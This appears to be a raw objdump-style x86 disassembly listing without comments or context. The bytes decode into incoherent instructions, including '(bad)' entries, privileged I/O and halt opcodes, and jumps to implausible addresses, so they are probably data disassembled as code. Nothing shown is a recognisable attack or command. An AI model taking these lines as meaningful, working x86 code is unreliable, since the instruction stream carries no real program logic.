  41ad8c:	out    0x41,eax
  41ad8e:	aaa    
  41ad8f:	and    al,0x0
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [esi+edi*4+0x4caf429],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	jl     0x41ae60
  41ae0e:	fild   WORD PTR [ecx]
  41ae10:	push   0xa48c4368
  41ae15:	push   edx
  41ae16:	jae    0x41ae1d
  41ae18:	out    dx,eax
  41ae19:	test   BYTE PTR [edi-0x63b091c4],al
  41ae1f:	xlat   BYTE PTR ds:[ebx]
  41ae20:	pusha  
  41ae21:	jnp    0x41adb4
  41ae23:	dec    ecx
  41ae24:	cwde   
  41ae25:	inc    ecx
  41ae26:	or     al,0xb8
  41ae28:	cld    
  41ae29:	jnp    0x41ae38
  41ae2b:	out    dx,eax
  41ae2c:	pop    ebp
  41ae2d:	xchg   ebx,eax
  41ae2e:	shl    DWORD PTR [ebx-0x42deffc6],cl
  41ae34:	add    BYTE PTR [ecx],dh
  41ae36:	imul   esp,DWORD PTR [esi+0x23],0x80d29127
  41ae3d:	jl     0x41adfb
  41ae3f:	pop    edi
  41ae40:	xchg   edx,eax
  41ae41:	js     0x41ae60
  41ae43:	call   0x1cee79bb
  41ae48:	loop   0x41add3
  41ae4a:	fld    QWORD PTR [ecx-0x7b9b4fa3]
  41ae50:	lock shl DWORD PTR [edi],1
  41ae53:	mov    DWORD PTR [edi+0x6cda013c],esi
  41ae59:	hlt    
  41ae5a:	ins    BYTE PTR es:[edi],dx
  41ae5b:	pop    ss
  41ae5c:	mov    bh,0x96
  41ae5e:	dec    ebp
  41ae5f:	arpl   WORD PTR [edi],dx
  41ae61:	into   
  41ae62:	jp     0x41aed8
  41ae64:	idiv   BYTE PTR [esi+0x4a]
  41ae67:	in     al,0x3b
  41ae69:	int    0x2c
  41ae6b:	lds    ecx,FWORD PTR [ecx+0x44]
  41ae6e:	jb     0x41aeac
  41ae70:	push   cs
  41ae71:	enter  0xa7d2,0xac
  41ae75:	push   ebx
  41ae76:	lea    esp,[edi-0x16b98257]
  41ae7c:	fsubrp st(2),st
  41ae7e:	out    dx,al
  41ae7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae80:	ins    BYTE PTR es:[edi],dx
  41ae81:	mov    ?,ebx
  41ae83:	shl    DWORD PTR [edi],cl
  41ae85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae86:	inc    edi
  41ae87:	mov    al,ds:0xcac7e6a6
  41ae8c:	popa   
  41ae8d:	cwde   
  41ae8e:	out    0x91,eax
  41ae90:	jne    0x41aede
  41ae92:	addr16 and al,0x43
  41ae95:	jecxz  0x41aec6
  41ae97:	and    ah,BYTE PTR [edi]
  41ae99:	lahf   
  41ae9a:	push   ss
  41ae9b:	ins    BYTE PTR es:[edi],dx
  41ae9c:	das    
  41ae9d:	and    ah,ah
  41ae9f:	sti    
  41aea0:	and    bh,ch
  41aea2:	imul   edx,DWORD PTR [ecx-0x69],0xffffffd9
  41aea6:	jbe    0x41af1e
  41aea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aea9:	or     al,0x20
  41aeab:	push   eax
  41aeac:	inc    eax
  41aead:	dec    eax
  41aeae:	(bad)  
  41aeaf:	cmp    ecx,DWORD PTR [ebp+ebp*1-0x45]
  41aeb3:	sub    DWORD PTR [ecx-0x56e7b9ab],ecx
  41aeb9:	sub    esp,edx
  41aebb:	ss pushf 
  41aebd:	stos   DWORD PTR es:[edi],eax
  41aebe:	add    dl,BYTE PTR [eax]
  41aec0:	retf   
  41aec1:	stc    
  41aec2:	dec    ebp
  41aec3:	imul   ebx,ecx,0xffffff99
  41aec6:	(bad)  
  41aec7:	cmc    
  41aec8:	mov    edi,?
  41aeca:	mov    bl,BYTE PTR fs:[esi+edx*8]
  41aece:	push   0xfffffffa
  41aed0:	sbb    al,0xc2
  41aed2:	xchg   esp,eax
  41aed3:	dec    eax
  41aed4:	and    ch,BYTE PTR [esi-0x13e74c51]
  41aeda:	rol    BYTE PTR [ecx],0xf7
  41aedd:	cli    
  41aede:	frndint 
  41aee0:	ds pop eax
  41aee2:	pop    esi
  41aee3:	sbb    al,0xd9
  41aee5:	sub    esi,esi
  41aee7:	add    al,0x6a
  41aee9:	pop    edx
  41aeea:	inc    esp
  41aeeb:	js     0x41ae7c
  41aeed:	mov    cs,WORD PTR [esi-0x57]
  41aef0:	xchg   ebx,eax
  41aef1:	stc    
  41aef2:	add    BYTE PTR [edx+0x44724cc1],dl
  41aef8:	sahf   
  41aef9:	jmp    0x703bac6d
  41aefe:	and    esi,DWORD PTR ds:0x4617e5fb
  41af04:	bound  edi,QWORD PTR gs:[edi+0x6e3db174]
  41af0b:	inc    ebx
  41af0c:	sti    
  41af0d:	mov    edx,DWORD PTR [edx]
  41af0f:	int3   
	...
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x1cf044ee
  41af82:	push   edi
  41af83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af84:	or     BYTE PTR [esi],bl
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    al,0x1
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	fisttp DWORD PTR [esi+0xa]
  41af8f:	(bad)  
  41af90:	cmp    bh,BYTE PTR [esi]
  41af92:	mov    edi,0xc1a9e232
  41af97:	mov    esi,0x8766b711
  41af9c:	add    DWORD PTR [ebx],ebx
  41af9e:	shl    BYTE PTR [ecx+0x55],1
  41afa1:	cvtps2pi mm3,QWORD PTR [edi+0x2c]
  41afa5:	ja     0x41afce
  41afa7:	icebp  
  41afa8:	push   0x5
  41afaa:	pop    DWORD PTR [ecx-0x7f6d5953]
  41afb0:	add    BYTE PTR [edi],ch
  41afb2:	lahf   
  41afb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afb5:	sar    esi,1
  41afb7:	inc    ebp
  41afb8:	test   al,0x7d
  41afbb:	jnp    0x41b037
  41afbd:	dec    edx
  41afbe:	push   0xffffffd1
  41afc0:	cli    
  41afc1:	addr16 loop 0x41af45
  41afc4:	stos   DWORD PTR es:[edi],eax
  41afc5:	test   DWORD PTR [ebp-0x2e],eax
  41afc8:	sbb    ebp,DWORD PTR [ebp-0x9]
  41afcb:	ins    DWORD PTR es:[edi],dx
  41afcc:	sbb    al,0xf
  41afce:	aad    0xec
  41afd0:	and    bl,bh
  41afd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afd3:	fistp  QWORD PTR [eax-0x2b9b1aaf]
  41afd9:	jno    0x41b044
  41afdb:	ins    DWORD PTR es:[edi],dx
  41afdc:	stos   DWORD PTR es:[edi],eax
  41afdd:	sahf   
  41afde:	add    al,0xb0
  41afe0:	fild   WORD PTR [eax]
  41afe2:	mov    ?,WORD PTR [ebx+edx*1-0x4cc745d4]
  41afe9:	cwde   
  41afea:	xor    ah,al
  41afec:	xchg   ecx,eax
  41afed:	enter  0x486f,0xb9
  41aff1:	push   0xbb3025d0
  41aff6:	sub    al,0x9b
  41aff8:	cmp    al,0x81
  41affa:	jo     0x41b050
  41affc:	mov    bh,0x5d
  41affe:	cli    
  41afff:	mov    dl,BYTE PTR [edx]
  41b001:	xlat   BYTE PTR ds:[ebx]
  41b002:	xor    al,0xdd
  41b004:	dec    edi
  41b005:	call   0x3257:0xae6e4374
  41b00c:	sar    DWORD PTR [edx-0x2e],0xf9
  41b010:	push   ss
  41b011:	pop    ss
  41b012:	pop    ds
  41b013:	mov    al,0x1e
  41b015:	pop    esp
  41b016:	xor    BYTE PTR ss:[esi-0x51e5535e],0xac
  41b01e:	sub    al,0x83
  41b020:	jl     0x41afac
  41b022:	mov    ah,0xfc
  41b024:	int3   
  41b025:	cwde   
  41b026:	repz pop esp
  41b028:	and    dh,BYTE PTR [ebx]
  41b02a:	or     DWORD PTR [eax],ebp
  41b02c:	dec    ebp
  41b02d:	enter  0xe879,0x5e
  41b031:	in     eax,dx
  41b032:	jge    0x41b0a7
  41b034:	add    eax,0x45479354
  41b039:	sub    DWORD PTR [ecx],eax
  41b03b:	jne    0x41b00a
  41b03d:	rol    BYTE PTR [eax],cl
  41b03f:	jecxz  0x41b05f
  41b041:	dec    esi
  41b042:	int    0xf8
  41b044:	lea    ebp,[edi-0x5d]
  41b047:	fcomp  QWORD PTR [edx+ebx*1-0x770f85f2]
  41b04e:	sbb    edx,DWORD PTR [edx+0x11c777a8]
  41b054:	jmp    0xd3170195
  41b059:	inc    esp
  41b05a:	mov    dh,0x40
  41b05c:	mov    cs:0x5ab257ae,eax
  41b062:	in     al,0x7e
  41b064:	jle    0x41b0c8
  41b066:	push   cs
  41b067:	retf   0xec70
  41b06a:	scas   eax,DWORD PTR es:[edi]
  41b06b:	bound  edx,QWORD PTR [esi-0x4]
  41b06e:	xchg   DWORD PTR [esi+0x7b5f6df0],esp
  41b074:	fmul   QWORD PTR ds:0x95c502ec
  41b07a:	xchg   ebp,eax
  41b07b:	stos   DWORD PTR es:[edi],eax
  41b07c:	add    al,0x83
  41b07e:	aas    
  41b07f:	push   ebp
  41b080:	cmp    BYTE PTR [edi+0x3e],ch
  41b083:	jae    0x41b0e3
  41b085:	adc    al,0x30
  41b087:	jge    0x41b0da
  41b089:	not    esp
  41b08b:	mov    ch,0xd2
  41b08d:	nop
  41b08e:	imul   ebp,DWORD PTR [edx+0x0],0x0
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x92e17027
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	sbb    BYTE PTR [esi],bh
  41b10e:	add    al,0x8c
  41b110:	jbe    0x41b170
  41b112:	jmp    0x41b0b2
  41b114:	out    0x3f,al
  41b116:	mov    dl,0xd
  41b118:	lahf   
  41b119:	xlat   BYTE PTR ds:[ebx]
  41b11a:	out    dx,eax
  41b11b:	mov    al,ds:0xd51e93df
  41b120:	xchg   esp,eax
  41b121:	(bad)  
  41b122:	cmp    al,0x8f
  41b124:	mov    eax,DWORD PTR [ebp-0x5e]
  41b127:	or     bl,BYTE PTR [ecx+0x45268520]
  41b12d:	mov    ebp,esi
  41b12f:	jge    0x41b113
  41b131:	rcl    BYTE PTR [edx-0x63581703],1
  41b137:	xor    DWORD PTR [ebx-0x1e],ecx
  41b13a:	out    0x51,al
  41b13c:	pop    edx
  41b13d:	mov    ds:0x521fac33,eax
  41b142:	xchg   esp,eax
  41b143:	popa   
  41b144:	cmp    al,0xaa
  41b146:	jmp    0x41b16f
  41b148:	inc    ecx
  41b149:	lds    ebp,FWORD PTR [ebp+0x514d1c20]
  41b14f:	out    dx,al
  41b150:	push   edx
  41b151:	cdq    
  41b152:	je     0x41b157
  41b154:	add    esp,0x832d1358
  41b15a:	mov    dh,0x7d
  41b15c:	sub    BYTE PTR [eax],al
  41b15e:	out    0x93,al
  41b160:	inc    edx
  41b161:	lea    edx,[esi]
  41b163:	out    dx,eax
  41b164:	(bad)  
  41b166:	faddp  st(2),st
  41b168:	cdq    
  41b169:	int    0xb1
  41b16b:	push   edx
  41b16c:	push   ebx
  41b16d:	fisub  DWORD PTR [esi+0x46a0bd72]
  41b173:	xor    BYTE PTR [ecx+ebp*1-0x3e],0x3c
  41b178:	and    ebp,edx
  41b17a:	mov    gs,WORD PTR [ebx-0x3950158]
  41b180:	jle    0x41b1b7
  41b182:	add    ch,BYTE PTR [eax]
  41b184:	cli    
  41b185:	xchg   ecx,eax
  41b186:	lods   al,BYTE PTR ds:[esi]
  41b187:	mov    al,ds:0x45249641
  41b18c:	inc    ebx
  41b18d:	dec    ebp
  41b18e:	daa    
  41b18f:	pop    es
  41b190:	pop    ds
  41b191:	pop    ss
  41b192:	push   ds
  41b193:	lods   al,BYTE PTR ds:[esi]
  41b194:	ins    BYTE PTR es:[edi],dx
  41b195:	jmp    0xbca7390d
  41b19a:	mov    dl,0x7f
  41b19c:	ds push edx
  41b19e:	sbb    eax,DWORD PTR ds:0xee09a095
  41b1a4:	inc    edx
  41b1a5:	dec    esp
  41b1a6:	sub    dh,BYTE PTR [ecx]
  41b1a8:	imul   DWORD PTR [ecx]
  41b1aa:	aas    
  41b1ab:	xchg   esp,eax
  41b1ac:	xchg   ebp,eax
  41b1ad:	mov    dh,0xc9
  41b1af:	cdq    
  41b1b0:	scas   al,BYTE PTR es:[edi]
  41b1b1:	sub    DWORD PTR [ebx],eax
  41b1b3:	jnp    0x41b155
  41b1b5:	or     al,0x32
  41b1b7:	pop    ebp
  41b1b8:	xchg   edi,eax
  41b1b9:	rol    DWORD PTR [edx],1
  41b1bb:	pop    ds
  41b1bc:	dec    edx
  41b1bd:	icebp  
  41b1be:	inc    eax
  41b1bf:	(bad)  
  41b1c0:	(bad)  
  41b1c2:	push   esp
  41b1c3:	pop    edi
  41b1c4:	daa    
  41b1c5:	jbe    0x41b1b1
  41b1c7:	div    DWORD PTR [ebx-0x48]
  41b1ca:	xchg   esp,eax
  41b1cb:	ficomp DWORD PTR [ebx]
  41b1cd:	icebp  
  41b1ce:	leave  
  41b1cf:	stos   BYTE PTR es:[edi],al
  41b1d0:	dec    esp
  41b1d1:	out    0x38,al
  41b1d3:	daa    
  41b1d4:	add    ebx,ebp
  41b1d6:	jnp    0x41b1c9
  41b1d8:	sub    al,ch
  41b1da:	ja     0x41b22b
  41b1dc:	mov    ds:0x2c6cb50f,eax
  41b1e1:	mov    ss,WORD PTR [edx+0x3c]
  41b1e4:	in     al,0x7d
  41b1e6:	lahf   
  41b1e7:	int    0x76
  41b1e9:	inc    eax
  41b1ea:	out    0x4d,eax
  41b1ec:	fwait
  41b1ed:	push   cs
  41b1ee:	loope  0x41b184
  41b1f0:	fnstenv [esi-0x4a]
  41b1f3:	data16 fldcw WORD PTR [ebx-0xfabb301]
  41b1fa:	cli    
  41b1fb:	ins    BYTE PTR es:[edi],dx
  41b1fc:	pop    es
  41b1fd:	sbb    eax,0xa2ab2920
  41b202:	icebp  
  41b203:	sub    cl,BYTE PTR [esi]
  41b205:	stc    
  41b206:	jns    0x41b1cb
  41b208:	call   DWORD PTR [ecx-0x3d2e7ec0]
  41b20e:	adc    al,0xf9
	...
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ecx],ch
  41b281:	fwait
  41b282:	stos   DWORD PTR es:[edi],eax
  41b283:	jmp    0x104:0x12010
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	cmp    ch,BYTE PTR [ebx-0x34ae7212]
  41b292:	out    dx,eax
  41b293:	sub    ecx,DWORD PTR [edx+0x23c5e60f]
  41b299:	mov    esi,0x8b73008d
  41b29e:	je     0x41b31f
  41b2a0:	mov    eax,ds:0x2931c262
  41b2a5:	pop    eax
  41b2a6:	fcomp  QWORD PTR [ebx]
  41b2a8:	cmp    al,0x4b
  41b2aa:	jno    0x41b2c4
  41b2ac:	mov    bl,0xf9
  41b2ae:	outs   dx,BYTE PTR ds:[esi]
  41b2af:	pushf  
  41b2b0:	bound  ebx,QWORD PTR [ebx+ecx*2-0x76c51354]
  41b2b7:	push   ebp
  41b2b8:	jbe    0x41b263
  41b2ba:	gs je  0x41b334
  41b2bd:	xchg   DWORD PTR [esi+0x72],ebx
  41b2c0:	test   eax,0xdbc37292
  41b2c5:	lock pop edi
  41b2c7:	jo     0x41b277
  41b2c9:	scas   al,BYTE PTR es:[edi]
  41b2ca:	(bad)  
  41b2cc:	mov    eax,0x4b60548c
  41b2d1:	mov    ebp,0xafc15ad4
  41b2d6:	mov    esi,0x6cf30586
  41b2db:	ins    BYTE PTR es:[edi],dx
  41b2dc:	mov    ds,WORD PTR [ebp+0x529e3a27]
  41b2e2:	dec    ecx
  41b2e3:	sbb    eax,0xfecfe17
  41b2e8:	loope  0x41b362
  41b2ea:	rdtsc  
  41b2ec:	sbb    eax,0x19ca0692
  41b2f1:	push   cs
  41b2f2:	or     al,0xc7
  41b2f4:	popa   
  41b2f5:	pusha  
  41b2f6:	in     al,0xa8
  41b2f8:	push   edi
  41b2f9:	sub    ch,dl
  41b2fb:	jmp    0x41b2c3
  41b2fd:	outs   dx,DWORD PTR ds:[esi]
  41b2fe:	bound  ebx,QWORD PTR [ebx+0x29]
  41b301:	mov    al,ds:0x5c02eb9b
  41b306:	fiadd  DWORD PTR [edx+0x50]
  41b309:	popf   
  41b30a:	pop    es
  41b30b:	cmp    ch,BYTE PTR [edi+0x36a621cb]
  41b311:	out    dx,eax
  41b312:	mov    ecx,0xf51bf3a
  41b317:	stos   DWORD PTR es:[edi],eax
  41b318:	loop   0x41b2c1
  41b31a:	lea    eax,[esi]
  41b31c:	ds mov edx,0xbd721651
  41b322:	mov    ah,BYTE PTR [ebp-0xa485dae]
  41b328:	dec    edx
  41b329:	loope  0x41b363
  41b32b:	pop    ss
  41b32c:	leave  
  41b32d:	test   BYTE PTR [ebx+0x47],0x3f
  41b331:	repz fistp WORD PTR [ebp+edi*2-0x62eea538]
  41b339:	leave  
  41b33a:	stos   DWORD PTR es:[edi],eax
  41b33b:	and    BYTE PTR [eax-0x43],0xfe
  41b33f:	daa    
  41b340:	push   ebp
  41b341:	or     eax,0x4d89b59
  41b346:	int    0x4c
  41b348:	adc    esp,DWORD PTR [edx-0x20fcd312]
  41b34e:	mov    al,ds:0xb7596739
  41b353:	pop    esi
  41b354:	das    
  41b355:	cmp    BYTE PTR [ebx-0x3c],cl
  41b358:	push   es
  41b359:	pop    edx
  41b35a:	xchg   BYTE PTR [eax],ah
  41b35c:	lods   eax,DWORD PTR ds:[esi]
  41b35d:	hlt    
  41b35e:	sub    ah,ah
  41b360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b361:	or     eax,0xe1baca95
  41b366:	retf   0x450b
  41b369:	ja     0x41b3d5
  41b36b:	pop    edx
  41b36c:	loopne 0x41b338
  41b36e:	ds sahf 
  41b370:	div    BYTE PTR [ebp-0x41]
  41b373:	or     BYTE PTR [edi-0x6874b3a7],dh
  41b379:	cmp    esp,DWORD PTR [eax+0x6fd176b3]
  41b37f:	(bad)  
  41b380:	pop    esp
  41b381:	(bad)  
  41b382:	(bad)  
  41b383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b384:	inc    eax
  41b385:	dec    esi
  41b386:	imul   eax,DWORD PTR [ebp+edi*1-0x1bf1176f],0x84ba2b
	...
  41b3f1:	add    BYTE PTR [eax],al
  41b3f3:	add    BYTE PTR [eax+0xd],cl
  41b3f6:	sbb    eax,0xfebb5dab
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	rcl    BYTE PTR [eax],1
  41b402:	or     cl,0x14
  41b405:	and    DWORD PTR [ecx],eax
  41b407:	add    BYTE PTR [ecx+eax*1],al
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	je     0x41b41a
  41b40e:	jnp    0x2177f077
  41b414:	adc    BYTE PTR [edx-0x653da76f],al
  41b41a:	xchg   ebp,eax
  41b41b:	fld    TBYTE PTR [eax+0x7a208e58]
  41b421:	and    eax,0x12ff5293
  41b426:	add    bl,ah
  41b428:	scas   eax,DWORD PTR es:[edi]
  41b429:	imul   edi,DWORD PTR [esp+esi*8+0x3c5f8bb0],0xffffffda
  41b431:	mov    ebp,0x76b7becc
  41b436:	push   edi
  41b437:	test   al,0x12
  41b439:	shl    DWORD PTR [edx+0x6743392d],1
  41b43f:	mov    bl,0x87
  41b441:	fs inc esi
  41b443:	mov    bl,0xce
  41b445:	(bad)  
  41b446:	mov    ebx,0x8ead0c9b
  41b44b:	sub    eax,0xd2e925e8
  41b450:	iret   
  41b451:	xchg   edx,eax
  41b452:	push   edi
  41b453:	lock mov ah,0xb4
  41b456:	sbb    al,0x56
  41b458:	jmp    0x44f049ba
  41b45d:	dec    esp
  41b45e:	shr    BYTE PTR [ebx-0x4d6641c1],0x59
  41b465:	push   0xc32e167f
  41b46a:	imul   BYTE PTR [esi]
  41b46c:	jmp    FWORD PTR [ebx+0x4d]
  41b46f:	adc    al,0x51
  41b471:	test   BYTE PTR ds:0xc9f6717f,0xe4
  41b478:	mov    edx,DWORD PTR [ebx]
  41b47a:	(bad)  
  41b47c:	cmp    BYTE PTR [eax+0x2e03200e],0x74
  41b483:	xchg   ebx,eax
  41b484:	add    esp,edi
  41b486:	lock out 0x72,eax
  41b489:	or     eax,0x6140fe42
  41b48e:	pop    ebp
  41b48f:	ins    DWORD PTR es:[edi],dx
  41b490:	mov    ds:0xbd30c8f7,eax
  41b495:	repz cmp edx,DWORD PTR [edx+eiz*4]
  41b499:	adc    DWORD PTR [eax-0x10],esi
  41b49c:	fwait
  41b49d:	and    al,0xf
  41b49f:	jg     0x41b4ff
  41b4a1:	adc    ah,dh
  41b4a3:	xor    al,BYTE PTR [eax+eiz*1-0x66]
  41b4a7:	mov    ebp,0xd14e6263
  41b4ac:	and    esi,DWORD PTR [ebp+eiz*2-0x3a8f7250]
  41b4b3:	mov    bh,0x1b
  41b4b5:	setb   BYTE PTR [ebp+0xd4c929f]
  41b4bc:	lods   eax,DWORD PTR ds:[esi]
  41b4bd:	ins    DWORD PTR es:[edi],dx
  41b4be:	adc    eax,0x40897f5a
  41b4c3:	jmp    0x9925:0x1ad8480e
  41b4ca:	inc    edi
  41b4cb:	test   al,0x43
  41b4cd:	jns    0x41b4c8
  41b4cf:	mov    edx,0xb91dc5
  41b4d4:	(bad)  
  41b4d5:	xlat   BYTE PTR ds:[ebx]
  41b4d6:	pop    eax
  41b4d7:	mov    ecx,0x71e78a73
  41b4dc:	adc    bl,BYTE PTR [esi-0x61867464]
  41b4e2:	mov    bl,0x94
  41b4e4:	dec    esi
  41b4e5:	cld    
  41b4e6:	mov    dh,0xfc
  41b4e8:	popa   
  41b4e9:	lods   eax,DWORD PTR ds:[esi]
  41b4ea:	scas   al,BYTE PTR es:[edi]
  41b4eb:	sub    al,BYTE PTR [eax+0x114e9f05]
  41b4f1:	sbb    bl,BYTE PTR ds:0xc0c03463
  41b4f7:	popa   
  41b4f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4f9:	sbb    cl,BYTE PTR [ebp+0x26c733c]
  41b4ff:	inc    ecx
  41b500:	pop    edi
  41b501:	or     esi,eax
  41b503:	or     ecx,DWORD PTR [ecx]
  41b505:	cmp    BYTE PTR [ecx-0x3d],cl
  41b508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b509:	imul   esp,DWORD PTR [ebx],0x8d64ed05
  41b50f:	lds    eax,FWORD PTR [eax]
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	dec    eax
  41b581:	xchg   ebp,eax
  41b582:	ja     0x41b601
  41b584:	sbb    BYTE PTR [edx],ah
  41b586:	add    DWORD PTR [eax],eax
  41b588:	add    al,0x1
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	(bad)  
  41b58d:	pop    ds
  41b58e:	xlat   BYTE PTR ds:[ebx]
  41b58f:	cld    
  41b590:	sar    DWORD PTR ds:0xe3404ab9,1
  41b596:	cmp    DWORD PTR [edi+eax*4],ecx
  41b599:	ss aad 0xd9
  41b59c:	sub    al,0xd8
  41b59e:	dec    esp
  41b59f:	popa   
  41b5a0:	repz mov bl,dh
  41b5a3:	in     eax,0x6
  41b5a5:	jl     0x41b61d
  41b5a7:	xchg   BYTE PTR [ebx+0x2fa6c33c],ch
  41b5ad:	push   ss
  41b5ae:	popa   
  41b5af:	dec    ebx
  41b5b0:	je     0x41b5e9
  41b5b2:	jne    0x41b61b
  41b5b4:	mov    BYTE PTR [eax],al
  41b5b6:	cmp    DWORD PTR [ecx-0x66adb0f3],0x282eecaa
  41b5c0:	in     eax,0x1c
  41b5c2:	mul    DWORD PTR [edi-0x16f9949c]
  41b5c8:	xchg   ebx,eax
  41b5c9:	pop    ebx
  41b5ca:	adc    eax,0x8cb598b8
  41b5cf:	shl    BYTE PTR [ecx+0x69],0x24
  41b5d3:	sub    al,0x86
  41b5d5:	add    DWORD PTR [edi+0x5574d85b],edi
  41b5db:	ss das 
  41b5dd:	ret    
  41b5de:	and    esi,DWORD PTR [ecx-0x70]
  41b5e1:	push   ecx
  41b5e2:	call   0x5d9881dc
  41b5e7:	and    al,0xba
  41b5e9:	ins    BYTE PTR es:[edi],dx
  41b5ea:	or     eax,0x197bad8e
  41b5ef:	adc    al,0x90
  41b5f1:	mov    bl,0x0
  41b5f3:	cmc    
  41b5f4:	lods   al,BYTE PTR ds:[esi]
  41b5f5:	inc    ebx
  41b5f6:	data16 sbb dl,BYTE PTR [edi-0x80]
  41b5fa:	jle    0x41b5c4
  41b5fc:	xor    al,BYTE PTR [edx+0x6e70371]
  41b602:	ds mov dh,0x5c
  41b605:	out    0xa0,eax
  41b607:	pop    ds
  41b608:	mov    ch,0x4
  41b60a:	pop    eax
  41b60b:	add    ebx,DWORD PTR ds:0x30ebbe1e
  41b611:	xchg   esp,eax
  41b612:	or     DWORD PTR [edi],0x8647dff4
  41b618:	and    edx,DWORD PTR [ebx]
  41b61a:	fsubrp st(5),st
  41b61c:	push   esi
  41b61d:	retf   
  41b61e:	or     ah,ah
  41b620:	push   es
  41b621:	enter  0xe0bd,0xdc
  41b625:	imul   dx,WORD PTR ds:0x254b1066,0xd52
  41b62e:	jmp    0xbecfe5f
  41b633:	jno    0x41b5ee
  41b635:	jg     0x41b65a
  41b637:	clc    
  41b638:	push   cs
  41b639:	sbb    edi,0xa008eedd
  41b63f:	xor    esp,edi
  41b641:	aas    
  41b642:	dec    esp
  41b643:	xor    BYTE PTR [eax+0x27],bh
  41b646:	sub    DWORD PTR [eax],esi
  41b648:	outs   dx,BYTE PTR ds:[esi]
  41b649:	push   ebx
  41b64a:	imul   edx,DWORD PTR [eax-0x556c3b91],0x3c
  41b651:	cld    
  41b652:	dec    ebp
  41b653:	push   esp
  41b654:	ror    DWORD PTR [edx+0x2d8a32f1],cl
  41b65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b65b:	jp     0x41b6ad
  41b65d:	test   BYTE PTR [ebx],0x5c
  41b660:	push   es
  41b661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b662:	mov    eax,0xb690a661
  41b667:	or     ebx,esp
  41b669:	jl     0x41b6d7
  41b66b:	or     eax,0x2bb86e8b
  41b670:	std    
  41b671:	div    BYTE PTR [edi]
  41b673:	mov    DWORD PTR ds:0x543f60c1,ebp
  41b679:	or     bl,BYTE PTR [eax-0x65]
  41b67c:	(bad)  
  41b67d:	(bad)
  41b680:	scas   al,BYTE PTR es:[edi]
  41b681:	ins    BYTE PTR es:[edi],dx
  41b682:	pusha  
  41b683:	xor    dh,BYTE PTR [esp+ecx*1-0x1c]
  41b687:	fnstsw WORD PTR [ecx]
  41b689:	jbe    0x41b6aa
  41b68b:	inc    ebp
  41b68c:	shl    BYTE PTR [ecx+0xc598],0x0
	...
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	cwde   
  41b701:	adc    ebx,DWORD PTR [ebx]
  41b703:	mov    ecx,0x1231c
  41b708:	add    al,0x1
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	dec    eax
  41b70d:	out    0x37,eax
  41b70f:	xor    eax,0x77140c1c
  41b714:	lahf   
  41b715:	sub    eax,0x2386b4b7
  41b71a:	sub    eax,0xb8ba46ed
  41b71f:	daa    
  41b720:	jno    0x41b746
  41b722:	xor    ebp,DWORD PTR [eax]
  41b724:	push   edx
  41b725:	jne    0x41b701
  41b727:	stos   DWORD PTR es:[edi],eax
  41b728:	jp     0x41b6b2
  41b72a:	lea    esi,[ebp-0x76868dc]
  41b730:	lahf   
  41b731:	(bad)  
  41b732:	popa   
  41b733:	aad    0xf
  41b735:	jmp    0x41b6d5
  41b737:	jmp    0xe646b34b
  41b73c:	out    0x73,eax
  41b73e:	les    esp,FWORD PTR [edi+0x69efa684]
  41b744:	adc    eax,0xecbb35ee
  41b749:	inc    ebp
  41b74a:	outs   dx,BYTE PTR ds:[esi]
  41b74b:	adc    BYTE PTR [edx],0x3b
  41b74e:	inc    esi
  41b74f:	sti    
  41b750:	arpl   WORD PTR [edx],bp
  41b752:	sub    DWORD PTR ds:0x664fa35e,0x62
  41b759:	shl    DWORD PTR [edi+esi*1],0x15
  41b75d:	test   eax,0x67255238
  41b762:	jnp    0x41b7a3
  41b764:	sub    al,0xaa
  41b766:	stos   BYTE PTR es:[edi],al
